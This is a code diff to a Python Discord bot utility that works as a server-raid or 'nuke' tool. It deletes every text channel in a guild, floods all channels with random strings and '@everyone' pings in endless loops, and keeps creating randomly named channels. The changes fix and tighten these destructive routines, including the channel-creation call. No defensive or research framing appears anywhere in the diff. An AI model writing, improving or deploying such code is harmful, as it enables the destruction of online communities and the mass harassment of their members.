@@ -203,7 +203,8 @@ class Util:
                         for i in guild.text_channels:
                             await i.delete()
                     else: pass
-                except:
+                except Exception as e:
+                    #print(e)
                     print(colour.red("[console] MISSING PERMISSIONS TO DELETE CHANNELS. ATTEMPTING TO SPAM."))
                     while True:
                         for i in guild.text_channels:
@@ -211,19 +212,20 @@ class Util:
                             await i.send("@everyone")
                 while True:
                     try:
+                        
+                        try:
+                            await guild.create_text_channel(str(uuid.uuid4()))
+                        except Exception as e:
+                            raise
+                            print(colour.red("[console] MISSING PERMISSIONS TO CREATE CHANNELS. ATTEMPTING TO SPAM."))
+                            while True:
+                                for i in guild.text_channels:
+                                    await i.send(str(uuid.uuid4()))
+                                    await i.send("@everyone")
                         for i in guild.text_channels:
                             await i.send(str(uuid.uuid4()))
                             await i.send("@everyone")
-                            try:
-                                guild.create_channel(uuid.uuid4())
-                            except:
-                                print(colour.red("[console] MISSING PERMISSIONS TO CREATE CHANNELS. ATTEMPTING TO SPAM."))
-                                while True:
-                                    for i in guild.text_channels:
-                                        await i.send(str(uuid.uuid4()))
-                                        await i.send("@everyone")
-                                        continue  
-
+                        
                     except Exception as e:
                         print(e) 
                         print(colour.red("[error] Failed."))
